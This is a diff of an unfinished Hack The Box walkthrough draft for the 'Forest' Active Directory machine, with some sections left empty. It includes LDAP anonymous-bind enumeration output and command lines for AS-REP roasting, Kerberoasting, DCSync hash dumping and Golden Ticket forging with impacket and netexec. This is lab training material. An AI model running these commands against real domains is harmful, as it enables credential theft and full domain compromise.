@@ -2,7 +2,7 @@
 #+HUGO_BASE_DIR: ~/Dropbox/40-49_Career/44-Blog/bloodstiller
 #+HUGO_SECTION:
 #+hugo_custom_front_matter: :draft true
-#+hugo_custom_front_matter: :title "<boxName> HTB Walkthrough"
+#+hugo_custom_front_matter: :title "<bx> HTB Walkthrough"
 #+hugo_custom_front_matter: :author bloodstiller
 #+hugo_custom_front_matter: :date 2024-10-10
 :HIDDEN:
@@ -18,11 +18,11 @@
 :END:
 
 
-* <boxName> Hack The Box Walkthrough/Writeup:
+* <bx> Hack The Box Walkthrough/Writeup:
 :PROPERTIES:
 :ID:       e3f25c99-179f-461d-9310-dd1f026d4ec1
 :END:
-- https://app.hackthebox.com/machines/<boxName>
+- https://app.hackthebox.com/machines/<bx>
 
 * How I use variables & Wordlists:
 :PROPERTIES:
@@ -102,106 +102,207 @@
 
 ** LDAP ~389~:
 :PROPERTIES:
-:ID:       2e42dbd8-49e7-4c58-84d5-19908110e112
+:ID:       6a27f462-51f8-437a-9357-004faa093013
 :END:
 *** Using LDAP anonymous bind to enumerate further:
 :PROPERTIES:
-:ID:       a04b2460-1898-47e3-924f-ebdd9b1ebb18
+:ID:       558ffa34-2558-47bc-8f37-e1674d74d810
 :END:
-  - If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.
-    - We can actually retrieve a significant amount of information via anonymous bind such as:
-      - A list of all users
-      - A list of all groups
-      - A list of all computers.
-      - User account attributes.
-      - The domain password policy.
-      - Enumerate users who are susceptible to AS-REPRoasting.
-      - Passwords stored in the description fields
-    - The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates.
+- If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.
+  - We can actually retrieve a significant amount of information via anonymous bind such as:
+    - A list of all users
+    - A list of all groups
+    - A list of all computers.
+    - User account attributes.
+    - The domain password policy.
+    - Enumerate users who are susceptible to AS-REPRoasting.
+    - Passwords stored in the description fields
+  - The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates.
 
-  - I actually have a handy script to check if anonymous bind is enabled & if it is to dump a large amount of information. You can find it here
-    - https://github.com/bloodstiller/ldapire
-    - https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb
-      - ~python3 /home/kali/windowsTools/enumeration/ldapire.py $box~
-        - It will dump general information & also detailed & simple information including:
-          - Groups
-          - Users
-  - It turns out the anonymous bind is not enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.
+- I actually have a handy script to check if anonymous bind is enabled & if it is to dump a large amount of information. You can find it here
+  - https://github.com/bloodstiller/ldapire
+  - https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb
+    - ~python3 /home/kali/windowsTools/enumeration/ldapire.py $box~
+      - It will dump general information & also detailed & simple information including:
+        - Groups
+        - Computers
+        - Users
+        - All domain objects
+        - A file containing all description fields
+        - It will also search the domain for any service/svc accounts and place them in a folder too.
 
-    A) _We have the naming context of the domain_:
-         #+begin_src shell
-  kali in ~/Desktop/WindowsTools 🐍 v3.12.6  2GiB/15GiB | 0B/1GiB with /usr/bin/zsh
-  🕙 08:50:47 zsh ❯ python3 ldapchecker.py $box
-  Attempting to connect to 10.129.229.239 with SSL...
-  Connected successfully. Retrieving server information...
-  DSA info (from DSE):
-    Supported LDAP versions: 3, 2
-    Naming contexts:
-      DC=outdated,DC=htb
-      CN=Configuration,DC=outdated,DC=htb
-      CN=Schema,CN=Configuration,DC=outdated,DC=htb
-      DC=DomainDnsZones,DC=outdated,DC=htb
-      DC=ForestDnsZones,DC=outdated,DC=htb
-      #+END_SRC
 
-    B) _We have the domain functionality level_:
-        #+begin_src shell
-  Other:
-    domainFunctionality:
-      7
-    forestFunctionality:
-      7
-    domainControllerFunctionality:
-      7
-    rootDomainNamingContext:
-      DC=outdated,DC=htb
-    ldapServiceName:
-      outdated.htb:dc$@OUTDATED.HTB
-        #+end_src
-       - The functionality level determines the minimum version of Windows server that can be used for a DC.
-         - +Note+: that any host os can be used on *workstations*, however the functionality level determines what the minimum version for DC's and the forest.
-         - https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels
-         - Knowing the function level is useful as if want to target the DC's and servers, we can know by looking at the function level what the minimum level of OS would be.
+  A) _We have the naming context of the domain_:
+       #+begin_src shell
+kali in HTB/BlogEntriesMade/Forest/scans/ldap  🍣 main 📝 ×143🗃️  ×3🛤️  ×113 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh
+🕙 08:32:01 zsh ❯ python3 /home/kali/windowsTools/enumeration/ldapire/ldapire.py $box
 
-         - In this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.
-         - Here’s a list of functional level numbers and their corresponding Windows Server operating systems:
+------------------------------------------------------------
+ Server Information
+------------------------------------------------------------
+  • IP Address  : 10.129.95.210
+  • Domain Name : htb.local
+  • Server Name : FOREST
+  • Forest Level: 7
+  • Domain Level: 7
 
-           | Functional Level Number | Corresponding OS            |
-           |                       0 | Windows 2000                |
-           |                       1 | Windows Server 2003 Interim |
-           |                       2 | Windows Server 2003         |
-           |                       3 | Windows Server 2008         |
-           |                       4 | Windows Server 2008 R2      |
-           |                       5 | Windows Server 2012         |
-           |                       6 | Windows Server 2012 R2      |
-           |                       7 | Windows Server 2016         |
-           |                       8 | Windows Server 2019         |
-           |                       9 | Windows Server 2022         |
+    #+END_SRC
 
-           - +Note+:
-             - Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest.
-             - As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers.
+- It turns out the anonymous bind is (+NOT+) enabled and we get the below information.
 
-    C) _We have the full server name_:
-       - Again we can see this has the CN as the base (mentioned previously.)
-         #+begin_src shell
-  serverName:
-      CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=outdated,DC=htb
-         #+end_src
-  - It's pretty amazing already what we have learned just by running some fairly simple ldap queries.
-    + We have the naming context.
-    + Domain name.
+  #+begin_src shell
+------------------------------------------------------------
+ Connection Attempts
+------------------------------------------------------------
+  • Attempting SSL connection...
+  ✗ Failed to connect with SSL
+  • Attempting non-SSL connection...
+  ✓ Connected successfully using anonymous bind
 
+------------------------------------------------------------
+ Security Warning
+------------------------------------------------------------
+  ⚠️  WARNING: Connected using Anonymous Bind
+  ⚠️  This is a security risk and should be disabled
+  #+end_src
+
+  B) _We have the domain functionality level_:
+      #+begin_src shell
+  • Forest Level: 7
+  • Domain Level: 7
+      #+end_src
+     - The functionality level determines the minimum version of Windows server that can be used for a DC.
+       - +Note+: that any host os can be used on *workstations*, however the functionality level determines what the minimum version for DC's and the forest.
+       - https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels
+       - Knowing the function level is useful as if want to target the DC's and servers, we can know by looking at the function level what the minimum level of OS would be.
+
+       - In this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.
+       - Here’s a list of functional level numbers and their corresponding Windows Server operating systems:
+
+         | Functional Level Number | Corresponding OS            |
+         |                       0 | Windows 2000                |
+         |                       1 | Windows Server 2003 Interim |
+         |                       2 | Windows Server 2003         |
+         |                       3 | Windows Server 2008         |
+         |                       4 | Windows Server 2008 R2      |
+         |                       5 | Windows Server 2012         |
+         |                       6 | Windows Server 2012 R2      |
+         |                       7 | Windows Server 2016         |
+         |                       8 | Windows Server 2019         |
+         |                       9 | Windows Server 2022         |
+
+         - +Note+:
+           - Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest.
+           - As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers.
+
+  C) _We have the full server name & domain name_:
+       #+begin_src shell
+------------------------------------------------------------
+ Server Information
+------------------------------------------------------------
+  • IP Address  : 10.129.95.210
+  • Domain Name : htb.local
+  • Server Name : FOREST
+       #+end_src
+- It's pretty amazing already what we have learned just by running some fairly simple ldap queries.
+  + We have the naming context.
+  + Domain name.
+
+- The script also has created several files with various amounts on information lets examine those.
+  #+begin_src shell
+------------------------------------------------------------
+ Processing Users
+------------------------------------------------------------
+[+] Detailed results written to UsersDetailed.txt
+[+] Basic names written to Users.txt
+  ✓ Basic user names    → Users.txt
+  ✓ Detailed user info  → UsersDetailed.txt
+
+------------------------------------------------------------
+ Processing Groups
+------------------------------------------------------------
+[+] Groups written to GroupsDetailed.txt
+[+] Basic names written to Groups.txt
+  ✓ Basic group names   → Groups.txt
+  ✓ Detailed group info → GroupsDetailed.txt
+
+------------------------------------------------------------
+ Processing Computers
+------------------------------------------------------------
+[+] Computers written to ComputersDetailed.txt
+[+] Basic names written to Computers.txt
+  ✓ Basic computer names    → Computers.txt
+  ✓ Detailed computer info  → ComputersDetailed.txt
+
+------------------------------------------------------------
+ Processing All Objects
+------------------------------------------------------------
+[+] Detailed results written to ObjectsDetailedLdap.txt
+[+] Basic names written to Objects.txt
+  ✓ Basic object names     → Objects.txt
+  ✓ Detailed object info   → ObjectsDetailedLdap.txt
+
+------------------------------------------------------------
+ Processing Descriptions
+------------------------------------------------------------
+[+] All descriptions written to AllObjectDescriptions.txt
+  ✓ All object descriptions → AllObjectDescriptions.txt
+  #+end_src
+
+It will also check for any service accounts and write them to a file:
+#+begin_src shell
+-----------------------------------------------------------
+ Searching for Service Accounts
+------------------------------------------------------------
+  🔍 Searching Users.txt
+  - No matches in Users.txt
+  🔍 Searching UsersDetailed.txt
+  ✓ Found matches in UsersDetailed.txt
+  🔍 Searching Groups.txt
+  ✓ Found matches in Groups.txt
+  🔍 Searching GroupsDetailed.txt
+  ✓ Found matches in GroupsDetailed.txt
+  🔍 Searching Objects.txt
+  ✓ Found matches in Objects.txt
+  🔍 Searching ObjectsDetailedLdap.txt
+  ✓ Found matches in ObjectsDetailedLdap.txt
+  🔍 Searching AllObjectDescriptions.txt
+  ✓ Found matches in AllObjectDescriptions.txt
+
+  ✓ Service account findings written to ServiceAccounts.txt
+  ✓ Found 646 potential matches
+
+#+end_src
+
+*** Checking the objects file:
+:PROPERTIES:
+:ID:       0077a4d6-6b97-4478-880f-6755a72bdcf8
+:END:
+
+*** Searching the descriptions file for any passwords:
+:PROPERTIES:
+:ID:       a96cef40-b1e9-4c49-870c-6cf2a94db795
+:END:
+
+*** Checking the users file:
+:PROPERTIES:
+:ID:       f7356e49-b6c1-496f-8ae3-497c114b0469
+:END:
+
+*** Finding an unlisted service account svc-alfresco:
+:PROPERTIES:
+:ID:       41c9ab86-d11f-4e08-848f-2a2c1bf9adad
+:END:
 *** Updating ETC/HOSTS & Variables:
 :PROPERTIES:
 :ID:       70c39e1a-91a2-4102-898c-d195b5b42155
 :END:
 - *Updated Domain & Machine Variables for Testing*:
   - Now that I have this information, I can update the ~domain~ and ~machine~ variables used in tests:
-    - ~update_var domain "certified.htb"~
-    - ~update_var machine "DC01"~
+    - ~update_var domain "htb.local"~
+    - ~update_var machine "forest"~
 
-- *Updating ~/etc/hosts~ for DNS and LDAP Queries*:
+- *Updating* ~/etc/hosts~ *for DNS and LDAP Queries*:
   - I update my ~/etc/hosts~ file to enable tools like [[https://github.com/ropnop/kerbrute][kerbrute]] for user enumeration and other tools that require DNS or LDAP for queries:
     - ~echo "$box   $domain $machine.$domain" | sudo tee -a /etc/hosts~
 
@@ -229,6 +330,7 @@
 :END:
 - As kerberos is present we can enumerate users using [[https://github.com/ropnop/kerbrute][kerbrute]]:
   - ~kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt~
+
 *** Using netexec for ASReproasting:
 :PROPERTIES:
 :ID:       b16a1594-64e3-42e9-ae39-168baab3c1b9
@@ -236,6 +338,10 @@
 - *We should always try and asreproast with a null/guest session as it can lead to an easy win*:
   - ~netexec ldap $box -u '' -p '' --asreproast asrep.txt~
   - ~netexec ldap $box -u guest -p '' --asreproast asrep.txt~
+  - ~impacket-GetNPUsers $domain/ -request~
+    - This one will just work, without having to pass anything else.
+
+  - ~impacket-GetNPUsers $domain/ -dc-ip $box -usersfile Users.txt -format hashcat -outputfile asRepHashes.txt -no-pass~
 *** Using netexec for Kerberoasting:
 :PROPERTIES:
 :ID:       9c9985bd-717a-48a9-b628-ce8633a5acba
@@ -253,6 +359,7 @@
 - *This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold*:
   - ~netexec smb $box -u 'guest' -p '' --shares~
   - ~netexec smb $box -u '' -p '' --shares~
+- +Note+: We can see the build number is +Insert-Build+ We can now enumerate that.
 
 *** Trying Usernames as Passwords:
 :PROPERTIES:
@@ -273,6 +380,12 @@
   - ~impacket-lookupsid $domain/guest@$machine.$domain -domain-sids~
   - ~impacket-lookupsid guest@$box -domain-sids -no-pass~
   - +Note+: As we are using the "Guest" account we can just hit enter for a blank password
+
+** Searching for known vulnerabilities for the Windows Build number:
+:PROPERTIES:
+:ID:       0991a49e-2991-42c8-b77c-d903ac1cbd62
+:END:
+- As we were able to retrive the build number from netexec we can enumerate for known vulnerablities.
 
 ** Web ~80~:
 :PROPERTIES:
@@ -298,8 +411,7 @@
 :END:
 - *As we have valid credentials we can also connect to RPC to enumerate further*:
   - ~rpcclient -U $user $box~
-
-- +Cheatsheet+: I have an enumertion & attacking cheatsheet for RPC, available here:
+- +Cheatsheet+: I have an enumeration & attacking cheatsheet for RPC, available here:
   - https://bloodstiller.com/cheatsheets/rpc-cheatsheet/#enumerating-rpc-using-rpcclient
 
 - *Null session via RPC*:
@@ -340,11 +452,11 @@
 :PROPERTIES:
 :ID:       37a8061a-df18-452e-a13a-025297fb661f
 :END:
-** Dumping NTDS.dit/DC-SYNC attack:
+** Dumping NTDS.dit/DCSync attack:
 :PROPERTIES:
 :ID:       43858f16-d1b9-48be-a790-bfbd13b17275
 :END:
-- *Perform DC-Sync attack using netexec*:
+- *Perform DCSync attack using netexec*:
   - ~netexec smb $box -u $user -p $pass -M ntdsutil~
 
 - *Extract all hashes from netexec*
@@ -364,13 +476,13 @@
   - ~impacket-secretsdump $domain/$user:$pass@$box~
 
 
-+ *Sync our clock to the host using ntupdate*:
++ *Sync our clock to the host using ntpdate*:
   - ~sudo ntpdate -s $domain~
   - ~faketime "$(ntpdate -q $domain | cut -d ' ' -f 1,2)"~
 
-
 + *Using* ~impacket-ticketer~ *to create the Golden Ticket*:
   - ~impacket-ticketer -nthash $krbtgt -domain-sid $sid -domain $domain Administrator~
+  - ~impacket-ticketer -aesKey $krbtgt -domain-sid $sid -domain $domain Administrator~
 
 + *Export the ticket to the* ~KRB5CCNAME~ *Variable*:
   - ~export KRB5CCNAME=./Administrator.ccache~
